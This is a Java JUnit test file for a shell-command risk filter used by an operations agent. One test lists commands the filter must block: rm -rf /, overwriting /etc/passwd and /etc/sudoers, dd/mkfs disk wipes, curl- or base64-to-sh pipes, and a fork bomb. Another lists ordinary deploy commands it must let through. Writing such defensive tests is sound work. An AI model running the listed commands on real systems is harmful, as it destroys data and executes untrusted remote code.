package uw.ops.agent.util;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;

/**
 * ShellRiskChecker 表驱动单测：危险栏收录历史实测绕过串（大小写混合、选项顺序、
 GNU 长选项、多参数、tee -a、curl|sh 等），安全栏锚定正常发布脚本形态——
 本过滤器曾因 toLowerCase 预处理导致 chmod/chown -R 模式永不匹配（死代码），
 复杂正则必须有表驱动测试锁定行为。
 */
class ShellRiskCheckerTest {

    @Test
    void dangerousCommandsBlocked() {
        //rm 根/系统目录：选项任意顺序、长选项、多参数、子路径、/* 形态
        assertBlocked("rm -rf /");
        assertBlocked("rm -r -f /");
        assertBlocked("rm -fr /");
        assertBlocked("rm -rf /etc");
        assertBlocked("rm -rf /usr /var /etc");
        assertBlocked("rm -rf /*");
        assertBlocked("rm / -rf");
        assertBlocked("rm --recursive --no-preserve-root /");
        assertBlocked("rm -rf /etc/nginx");
        assertBlocked("/bin/rm -rf /");
        //外围目录仅目录本身拦（子路径是发布删旧目录常态，见安全栏）
        assertBlocked("rm -rf /opt");
        assertBlocked("rm -rf /home");
        //chmod/chown：大小写混合的 -R（历史死模式，输入小写化后大写 R 永不匹配）
        assertBlocked("chmod -R 777 /");
        assertBlocked("chmod -r 777 /");
        assertBlocked("Chmod -R 777 /etc");
        assertBlocked("chown -R nobody /");
        assertBlocked("chown -R nobody:nogroup /etc");
        //覆写系统文件：tee -a / 管道形态
        assertBlocked("echo x | tee -a /etc/passwd");
        assertBlocked("echo x | sudo tee /etc/shadow");
        assertBlocked("echo hacker > /etc/passwd");
        assertBlocked("cp /tmp/x /etc/sudoers 2>/dev/null; install -m644 a /etc/sudoers");
        //格式化/擦除
        assertBlocked("mkfs.ext4 /dev/sda1");
        assertBlocked("dd if=/dev/zero of=/dev/sda");
        assertBlocked("dd of=/dev/vda if=/dev/urandom");
        assertBlocked("dd < /dev/zero > /dev/sdb");
        assertBlocked("wipefs -a /dev/sda");
        //网络内容管道到 shell
        assertBlocked("curl http://x.sh | sh");
        assertBlocked("curl -sL http://x | bash");
        assertBlocked("wget -qO- http://x | sh");
        assertBlocked("echo aGFTaA== | base64 -d | sh");
        //关机/fork bomb
        assertBlocked("shutdown -h now");
        assertBlocked("init 0");
        assertBlocked(":(){ :|:& };:");
    }

    @Test
    void legitimateScriptsPass() {
        //正常发布/运维脚本形态不得误杀
        assertSafe("docker run -d --name app-1 --memory 2g -p 8080:8080 myapp:1.0");
        assertSafe("docker rm -f app-old && docker rmi myapp:0.9");
        assertSafe("rm -rf /tmp/build-cache");
        assertSafe("rm -rf ./build /tmp/x.log");
        assertSafe("mv /opt/app/old.jar /opt/app/old.jar.bak");
        assertSafe("nohup java -jar app.jar --server.port=8081 >/dev/null 2>&1 &");
        assertSafe("chmod +x start.sh; chmod 644 /opt/app/config.yml");
        assertSafe("chown deploy:deploy /opt/app/app.jar");
        assertSafe("cp target.jar /opt/app/target.jar");
        assertSafe("tar -czf /tmp/bak.tar.gz /opt/app");
        assertSafe("curl -o /tmp/new.jar http://center/download/app.jar");
        assertSafe("echo done > /tmp/run.flag");
        assertSafe("kill -9 $(pgrep -f old-app)");
        //rm 家目录下业务路径（/home 子路径是发布删旧目录常态——见模式注释的白名单边界）
        assertSafe("rm -rf /home/deploy/app/old-release");
    }

    private void assertBlocked(String script) {
        assertNotNull(ShellRiskChecker.checkRisk(script), "must be blocked: " + script);
    }

    private void assertSafe(String script) {
        assertNull(ShellRiskChecker.checkRisk(script), "must pass: " + script);
    }
}
